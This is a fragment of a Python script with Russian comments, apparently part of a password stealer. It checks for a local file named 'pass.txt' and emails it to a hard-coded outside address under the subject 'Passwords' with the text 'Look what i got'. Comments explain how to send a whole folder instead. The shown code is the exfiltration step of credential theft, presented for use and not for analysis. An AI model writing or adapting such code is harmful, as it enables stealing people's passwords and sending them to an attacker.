...
def send_email(addr_to, msg_subj, msg_text, files):
    addr_from = "joke@bk.ru"                           # Отправитель
    password  = "joke"                                   # Пароль
...
addr_to   = "joke@mail.ru"                                # Получатель
 
files = ["pass.txt"]                                       # Если нужно отправить все файлы из заданной папки, нужно указать её
try:                                                       # Проверка наличия файла
    open("pass.txt")
    send_email(addr_to, "Passwords", "Look what i got", files)
except:
    send_email(addr_to, "Passwords", "nothing", [])
